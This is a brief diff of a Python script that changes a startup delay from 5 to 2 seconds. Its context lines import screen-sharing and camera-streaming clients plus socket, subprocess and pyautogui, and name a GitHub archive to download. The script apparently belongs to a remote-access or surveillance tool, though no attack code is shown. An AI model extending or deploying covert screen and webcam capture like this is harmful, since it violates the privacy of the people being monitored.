@@ -1,7 +1,7 @@
 import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui
 from vidstream import ScreenShareClient, CameraClient; from turtle import left
 from multiprocessing import Process
-time.sleep(5)
+time.sleep(2)
 url = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip"
     
 def getpath(change=False):
